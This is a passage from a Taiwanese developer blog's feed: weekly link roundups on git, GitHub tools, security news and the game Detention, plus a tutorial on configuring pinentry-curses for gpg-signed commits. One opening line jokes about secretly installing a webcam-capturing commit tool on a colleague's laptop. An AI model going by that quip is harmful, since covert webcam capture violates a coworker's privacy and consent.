&lt;li&gt;在每次 git commit 的時候用筆電的 webcam 拍照，然後跟 commit 存在一起，還可以做成 gif，感覺很適合偷偷裝在同事的筆電裏面。（咦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2300-visualize-your-project-s-community"&gt;Visualize your project's community · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;似乎只有支援 Ruby gem  &lt;/li&gt;
&lt;li&gt;Python 應該也能讀個 requirements.txt 就行哩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/minimaxir/big-list-of-naughty-strings"&gt;GitHub - minimaxir/big-list-of-naughty-strings: The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Big List of Naughty Strings is an evolving list of strings which have a high probability of causing issues when used as user-input data. This is intended for use in helping both automated and manual QA testing; useful for whenever your QA engineer walks into a bar.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;算是 web 的 QA 可以拿來測試用的清單吧，當然也包含了一些會造成資安問題的字串。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/schachmat/wego"&gt;schachmat/wego: weather app for the terminal&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;wego is a weather client for the terminal.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in"&gt;http://wttr.in&lt;/a&gt; 背後跑的程式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/chubin/pyphoon"&gt;chubin/pyphoon: ASCII Art Phase of the Moon (Python version)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Based on the original version of Jef Poskanzer jef@mail.acme.com written in Pascal in 1979 (and later translated by himself into C, and now by me into Python).  By default the number of lines is 30 and the date is today.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wttr.in/moon"&gt;wttr.in/moon&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl wttr.in/moon&lt;/code&gt; 可以在 Terminal 裏面看到月亮的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ngrok.com/docs"&gt;ngrok - secure introspectable tunnels to localhost&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Finally, I can develop Facebook messenger bot locally.  &lt;/li&gt;
&lt;li&gt;可以免費開 web proxy 的好用工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/01/law-allow-painted-car-2017/"&gt;交通部修法讓「彩繪車」合法上路 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;痛車要合法哩  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://play.google.com/store/apps/details?id=hearsilent.busplus"&gt;Bus ：全台公車動態查詢 - Android Apps on Google Play&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還不錯用，UX 還滿棒的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://4sacca.blogspot.com/2012/02/blog-post_2872.html"&gt;普世價值: 「每次看，回家就吐」&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為《返校》這款遊戲，而讓國民黨兩蔣執政時的白色恐怖時期再度浮上檯面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=nvdXowqlv5U"&gt;「What Did I Do Is For Your Own Good」 - Shanghai Rainbow Chamber Singers - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;薛丁格的春節 XDDD  &lt;/li&gt;
&lt;li&gt;太神啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.bnext.com.tw/article/42815/what-left-taiwanese-students-without-grades-qualifications-max-chou-found-the-meaning-of-learning-with-programming"&gt;「剝除了成績和學歷，台灣學生還剩下甚麼？」15歲周奕勳用程式語言找回學習的意義｜數位時代&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的一篇文章，15 歲就能找到自己的目標，如果能持續下去的話之後一定不容小覷。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為看了 Sully 這部電影，所以查了一些跟飛機有關的東西。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E9%A3%9B%E8%A1%8C%E7%B4%80%E9%8C%84%E5%84%80"&gt;飛行紀錄器 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;飛行記錄器（英語：Flight Recorder），俗稱黑盒子（實為橘色），是安裝在航空器上，用於航空事故調查、維修或及飛行試驗用途。安裝的位置在空難時最常被完整保留下來的機尾上。  &lt;/li&gt;
&lt;li&gt;1953年，世界上第一個飛航記錄器由澳洲研究實驗室的戴維·沃倫博士發明。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%BC%94%E5%8A%A9%E5%8B%95%E5%8A%9B%E7%B3%BB%E7%B5%B1"&gt;輔助動力系統 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;輔助動力系統（APU, Auxiliary power unit）主要用途是讓主發動機在停止狀態下，不依靠外部器材供應電力。不同形態的輔助動力系統可在不同的飛機和一些大型的地面交通工具上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://webcache.googleusercontent.com/search?q=cache:Z1ln2xorZrUJ:https://www.blueshop.com.tw/board/FUM200410061532262QU/BRD201701181842264E3.html+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk"&gt;抱怨文~遇到這種同事真是倒霉- 藍色小舖 BlueShop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我是一個在遊戲公司待了7年的程式設計師 最近公司來了一個程式設計師 雖然他不是我面試的 但也是在遊戲公司做了6.7年 然後程式設計師只有我們2個人 不得已只好一起開發 但我真的不知道他是怎麼做到6.7年的....  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;原文已經被作者自己刪除了，當初一堆人在說這篇文章是反串的時候我就斬釘截鐵說絕對不是，因為我真的有遇到這樣的人啊（嘆  &lt;/li&gt;
&lt;li&gt;備份  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://telegra.ph/%E5%82%99%E4%BB%BD-%E6%8A%B1%E6%80%A8%E6%96%87%E9%81%87%E5%88%B0%E9%80%99%E7%A8%AE%E5%90%8C%E4%BA%8B%E7%9C%9F%E6%98%AF%E5%80%92%E9%9C%89-01-20"&gt;http://telegra.ph/%E5%82%99%E4%BB%BD-%E6%8A%B1%E6%80%A8%E6%96%87%E9%81%87%E5%88%B0%E9%80%99%E7%A8%AE%E5%90%8C%E4%BA%8B%E7%9C%9F%E6%98%AF%E5%80%92%E9%9C%89-01-20&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://photos.google.com/share/AF1QipM-QTJeKQNgX2GL-Bzrw6vhMLZR6cr97FakGN9QKBp-xR0hbqQbABGMxCSHdV-YTQ/photo/AF1QipP_XkT41l33sahgcOBaUe2hiUgAHGiEaPfuEj9m?key=U3dDUTRQOHlmbzRVSjZPS1I3bmJWLUNFLUdqQm9R"&gt;https://photos.google.com/share/AF1QipM-QTJeKQNgX2GL-Bzrw6vhMLZR6cr97FakGN9QKBp-xR0hbqQbABGMxCSHdV-YTQ/photo/AF1QipP_XkT41l33sahgcOBaUe2hiUgAHGiEaPfuEj9m?key=U3dDUTRQOHlmbzRVSjZPS1I3bmJWLUNFLUdqQm9R&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/01/20/cia-declassified"&gt;幽浮、超能力、隱形墨水，一窺中情局 90 萬份解密文件 - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;曾經在 20 世紀 90 年代風靡全球的《X 檔案》，相信是不少喜歡科幻的讀者的童年美好回憶：外星人、預測未來、平行宇宙等光怪陸離事件，總讓人欲罷不能。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;detention&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Steam/M.1484898699.A.C07.html"&gt;[心得] 《返校》再玩一遍的原因是... - 看板 Steam - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;[有雷] 這篇《返校》的心得文真的寫得好棒  &lt;/li&gt;
&lt;li&gt;有些我沒注意到的細節啊，尤其是八卦的部份，原來有這樣的意思呢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/01/17/red-candle-detention-arg"&gt;赤燭「返校」遊戲 ARG 大解密！ - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;額 所以 ARG 到底是啥？  &lt;/li&gt;
&lt;li&gt;在我看來就是 CTF 的 Misc 題呀？  &lt;/li&gt;
&lt;li&gt;遊戲製作團隊也太用心了吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.3dmgame.com/bd/201701/3624081.html"&gt;返校detention歷史背景深度解析 深藏故事背後的真實&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國人對於《返校》這款遊戲寫的文章。  &lt;/li&gt;
&lt;li&gt;「人不是生而自由的嗎？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="algorithm"></category><category term="blog"></category><category term="cli"></category><category term="detention"></category><category term="git"></category><category term="github"></category><category term="misc"></category><category term="python"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>讓 gpg-agent 在 git commit gpg-sign 時使用 pinentry-curses</title><link href="https://blog.m157q.tw/posts/2017/01/20/make-gpg-agent-use-pinentry-curses-while-git-commit-gpg-sign/" rel="alternate"></link><published>2017-01-20T13:21:09+08:00</published><updated>2017-01-20T13:21:09+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-01-20:posts/2017/01/20/make-gpg-agent-use-pinentry-curses-while-git-commit-gpg-sign/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;git 使用 gpg sign 預設的 gpg-agent 會是 pinentry-gtk2&lt;br /&gt;
最近把 Arch Linux 筆電升上 Linux 4.8.13 後&lt;br /&gt;
X server 好像有 Buffer Overflow 還是 Garbage collection 沒做好的問題&lt;br /&gt;
跑一陣子就會跳掉&lt;br /&gt;
重新 &lt;code&gt;startx&lt;/code&gt; 還是可以動&lt;br /&gt;
但會抓不到 x window 的 output 變數&lt;br /&gt;
導致 git commit 在作 gpg sign 時&lt;br /&gt;
叫不出 &lt;code&gt;pinentry-gtk2&lt;/code&gt; 所以無法輸入 passpharse&lt;br /&gt;
直接噴  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;gpg&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;sign&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;  
&lt;span class="n"&gt;fatal&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;write&lt;/span&gt; &lt;span class="n"&gt;commit&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以就想說找找看有沒有可以在 terminal 裏面就解決&lt;br /&gt;
不用開 gtk 的方法&lt;br /&gt;
嗯 果然是有的  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;解法&lt;/h2&gt;
&lt;h3&gt;設定檔&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;~/.gnupg/gpg-agent.conf&lt;/code&gt;&lt;br /&gt;
（沒有這個 conf 的話就建一個，記得要 chmod 一下）  &lt;/p&gt;
&lt;p&gt;加入一行&lt;br /&gt;
&lt;code&gt;pinentry-program /usr/bin/pinentry-curses&lt;/code&gt;&lt;br /&gt;
（記得確認 &lt;code&gt;pinentry-curses&lt;/code&gt; 已經安裝且路徑正確，否則請安裝並自行修改到正確路徑）  &lt;/p&gt;
&lt;h3&gt;重新載入&lt;/h3&gt;
&lt;p&gt;之後讓 gpg-agent 重新載入，使用新的 pinentry-program&lt;br /&gt;
&lt;code&gt;gpg-connect-agent reloadagent /bye&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;設定變數&lt;/h3&gt;
&lt;p&gt;然後因為 &lt;code&gt;pinentry-curses&lt;/code&gt; 會需要用到 &lt;code&gt;$GPG_TTY&lt;/code&gt; 這個變數&lt;br /&gt;
所以請在自己使用的 .shellrc 裡頭加入  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Set GPG_TTY for pinentry-curses  
export GPG_TTY=$(tty)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;打完收工&lt;/h3&gt;
&lt;p&gt;沒意外的話這樣就行了&lt;br /&gt;
在原本的 shell 重新 source 一次修改好的 rc 檔&lt;br /&gt;
或是直接開啟一個新的 shell&lt;br /&gt;
確認有 &lt;code&gt;GPG_TTY&lt;/code&gt; 這個參數&lt;br /&gt;
之後用 git commit 在做 gpg sign 的時候&lt;br /&gt;
就可以直接在 terminal 裏面打 passphrase 了&lt;br /&gt;
不需要用到 GTK 和 X window 啦  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/GnuPG#Configuration_2"&gt;GnuPG - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="gpg"></category><category term="pinentry"></category><category term="git"></category></entry><entry><title>Y2017W02</title><link href="https://blog.m157q.tw/posts/2017/01/16/y2017w02/" rel="alternate"></link><published>2017-02-06T05:06:40+08:00</published><updated>2017-02-06T05:06:40+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-16:posts/2017/01/16/y2017w02/</id><summary type="html">&lt;h3&gt;ai&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openai.com/blog/GTA-V-plus-Universe/"&gt;GTA V | Universe&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Universe integration with Grand Theft Auto V, built and maintained by Craig Quiter's DeepDrive project, is now open-source. To use it, you'll just need a purchased copy of GTA V, and then your Universe agent will be able to start driving a car around the streets of a high-fidelity virtual world.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;用 GTA 5 來當作自動駕駛程式的模擬環境，這個真的是太天才了 XDDD，完全不用擔心會撞到人，或許 Uber 無人車的自動駕駛程式在加州上路之前應該先考慮用一下這個？  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/openai/universe"&gt;GitHub - openai/universe: Universe: a software platform for measuring and training an AI's general intelligence across the world's supply of games, websites and other applications.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Universe is a software platform for measuring and training an AI's general intelligence across the world's supply of games, websites and other applications. This is the universe open-source library, which provides a simple Gym interface to each Universe environment.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.heron.me/timeline-of-applying-american-graduate-school-5e59475eb448?source=rss----d0ef0e7db3bd---4&amp;amp;gi=f107c4a50a62"&gt;Timeline of Applying American Graduate School – Heron’s Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Useful.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.evanlin.com/weekly-prog-2016-12-29/"&gt;程式設計週記[2016/12/29]: 年底到了，先來點今年完成了哪些吧&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;除了佩服 2016 完成這麼多目標以外  &lt;/li&gt;
&lt;li&gt;這次也有不少有趣的文章呀  &lt;/li&gt;
&lt;li&gt;像是 lolrecaptcha  &lt;/li&gt;
&lt;li&gt;geohot 真的是無極限  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jacky.seezone.net/2016/12/29/8564/"&gt;開卷筆記—大數據：隱私篇 › 網絡暴民 Jacky's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「大腦的遺忘機制對我們來說很重要，使我們能夠專注於重要的事，過濾走不相關的，這樣我們才可能想像未來，作出計劃。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.tw/2016/12/blog-post.html"&gt;風吹草動: 自由的商業軟體&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;自由軟體 vs 專有軟體 =&amp;gt; 程式碼有沒有公開  &lt;/li&gt;
&lt;li&gt;商業軟體 vs 非商業軟體 =&amp;gt; 是否用於商業行為  &lt;/li&gt;
&lt;li&gt;自由軟體不代表非商業性質  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ahogrammer.com/2016/11/15/deep-learning-enables-you-to-hide-screen-when-your-boss-is-approaching/"&gt;Deep Learning Enables You to Hide Screen when Your Boss is Approaching | Ahogrammer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;竟然是開源的 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/12/28/7049/%e6%8a%8a%e6%89%8d%e8%83%bd%e7%94%a8%e5%9c%a8%e5%a5%87%e6%80%aa%e7%9a%84%e5%9c%b0%e6%96%b9%ef%bc%9a%e8%80%81%e9%97%86%e5%81%b5%e6%b8%ac%e5%99%a8/"&gt;把才能用在奇怪的地方：老闆偵測器 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;老闆偵測器 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/blog/moldova-transnistria-1"&gt;摩爾多瓦穿越之旅（一） - BYVoid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;東歐真神奇啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://opass.logdown.com/posts/1273243-the-story-of-auto-beverage-machine-1"&gt;因為自動飲料機而延畢的那一年(1) « Opass's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;為啥強者同學的暱稱從引擎改成歐趴了  &lt;/li&gt;
&lt;li&gt;這篇真的紀錄的很精彩啊，已經像是在寫小說了，真的是很寶貴的經驗呢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@c9s/%E9%9F%93%E8%AA%9E%E8%87%AA%E5%AD%B8%E6%BB%BF%E6%9C%88%E5%BF%83%E5%BE%97-74f2547b58d6?source=rss-c82974340894------2"&gt;韓語: 自學滿月心得 – c9s – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真詳細  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html"&gt;Orange: [Bug Bounty] GitHub Enterprise SQL Injection&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Orange 花了一個禮拜找到了這個沒正確使用 RoR 提供的 ActiveRecord 造成的 SQl Injecton vuln 然後拿了 5000 鎂。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/geoff-codes/02d1e45912253e9ac183"&gt;ruby_revealer.sh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;ruby_revealer.sh #!/usr/bin/sudo sh ## ruby_revealer.sh -- decrypt obfuscated GHE .rb files. 2.0.0 to 2.3.1+. ## From &lt;code&gt;strings ruby_concealer.so&lt;/code&gt;:  ##  ## &amp;gt; This obfuscation is intended to discourage GitHub Enterprise customers  ## &amp;gt; from making modifications to the VM.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/curl-cli-tcp-ssl-connection-time-2016/"&gt;CURL 於 CLI 顯示 TCP、SSL 的連線時間 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;跟 CURL 還是不夠熟啊，有好多參數可用呢  &lt;/li&gt;
&lt;li&gt;是說看到這個用法，我腦海中第一個浮現的是 &lt;code&gt;httpstat&lt;/code&gt; 這個工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;csnews&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/12/28/7050/%e5%be%9e-cyanogenmod-%e8%ae%8a%e6%88%90-lineage-os/"&gt;從 CyanogenMod 變成 Lineage OS | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;唔 CyanogenMod 竟然要停止更新了嗎？所以我的手機的 OS 也要換了嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/12/25/7043/%e4%b8%8b%e5%80%8b%e7%89%88%e6%9c%ac-firefox-%e7%9a%84-multi-process-%e5%b0%87%e9%a0%90%e8%a8%ad%e5%85%a8%e9%9d%a2%e9%96%8b%e5%95%9f/"&gt;下個版本 Firefox 的 Multi-Process 將預設全面開啟 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看起來速度應該會快不少  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/12/25/7041/nist-%e9%96%8b%e5%a7%8b%e5%be%b5%e6%b1%82-post-quantum-cryptography-%e6%bc%94%e7%ae%97%e6%b3%95/"&gt;NIST 開始徵求 Post-Quantum Cryptography 演算法 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;已經在徵求能夠防範量子電腦的加密演算法了呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/01/05/airyzone-combo-card"&gt;出門只要帶一張卡！物聯網公司 Airyzone 推出萬用卡片整合金融卡、信用卡、悠遊卡、RFID，還能當藍牙 Beacon - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像只有我覺得這樣很方便，大多數的人都覺得把雞蛋全放在同一個籃子實在太危險。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2017/01/yahoo-altaba-verizon.html"&gt;Goodbye! Yahoo to rename itself 'Altaba' after Verizon Deal&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;It's time to say goodbye to Yahoo!   While Yahoo's core internet business was being sold to Verizon for $4.8 Billion, the remaining portions of the company left behind is renaming itself to Altaba Inc, which marks the sad ending of one of the most familiar brand names on the internet.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;雅虎也要成為時代的眼淚了嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/jobs-api/"&gt;Cloud Jobs API | Job Search API  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Company career sites, job boards and applicant tracking systems can improve candidate experience and company hiring metrics with job search and discovery powered by sophisticated machine learning.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這個 API 感覺超級棒的耶，如果能被用來幫助提升台灣的勞方求職就更好了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.techug.com/git-reduce-volumn-tips"&gt;如何给git仓库瘦身 | 程序师&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;hmm... 裏面介紹了一些算進階一點的 git 用法  &lt;/li&gt;
&lt;li&gt;不過第 2 種方法把大檔案刪掉後呢？  &lt;/li&gt;
&lt;li&gt;大檔案就這樣被刪掉了？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/AlDanial/cloc#Basic_Use"&gt;GitHub - AlDanial/cloc: cloc counts blank lines, comment lines, and physical lines of source code in many programming languages.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Hosted at http://cloc.sourceforge.net/ since August 2006, cloc began the transition to GitHub in September 2015.  cloc counts blank lines, comment lines, and physical lines of source code in many programming languages.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;還不錯用的工具，計算整個專案的規模應該挺方便的，資訊也簡單明瞭。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/benlau/ihatecontentfarms"&gt;GitHub - benlau/ihatecontentfarms: Content Farm Blocker Chrome Extension / 封鎖內容農場Chrome插件&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;即使告訢朋友不要再轉載有關文章，結果還是不會消失，最後只能進行消極的抵抗 － 不點擊，不讓自己為對方的廣告收益帶來貢獻。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;裝一下來提醒自己正在進入內容農場網站挺好的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;java&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/law-oracle-license-java-sdk-2016/"&gt;Oracle 取締未經適當授權的 Java 用戶 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哇 真的要認真抓了嗎  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://learntemail.sam.today/blog/my-watch-runs-gnu-linux-and-it-is-amazing/"&gt;My WATCH runs GNU/Linux And It Is Amazing – LearntEmail&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;In 2015, I found myself becoming a very independent smart-watch reviewer. Due to some lucky conditions, I ended up with a free LG Watch Urbane. It was very snazzy, but I just didn't get the point of smartwatches. One day in 2016, I forgot to put it on.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;macos&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/12/create-account-and-ssh-permission-on-mac/"&gt;在 Mac 建立新帳號，並且開通 ssh 權限 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;ul&gt;
